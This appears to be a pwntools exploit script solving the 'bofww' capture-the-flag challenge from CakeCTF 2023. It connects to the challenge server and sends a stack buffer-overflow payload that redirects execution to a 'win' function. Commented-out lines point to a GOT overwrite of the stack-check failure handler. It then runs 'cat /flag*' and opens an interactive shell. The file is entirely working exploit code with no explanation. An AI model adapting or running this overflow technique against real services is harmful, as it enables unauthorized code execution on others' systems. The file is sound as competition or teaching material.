from pwn import *
p = remote("bofww.2023.cakectf.com", 9002)
# p = process("./bofww")

payload = flat(
    p64(0x4012f6), # win
    b'AAAAAAAA' * 0x25,
    # p64(0x404050),    # got _stack_check_fail spray
    # 0x1234567,   # size
    # 0x1234567,   # capacity
    # 0x03   # ???
)

p.sendlineafter(b"name? ", payload)
p.sendline(b'1337')
p.recv()
p.sendline(b"cat /flag*")

p.interactive()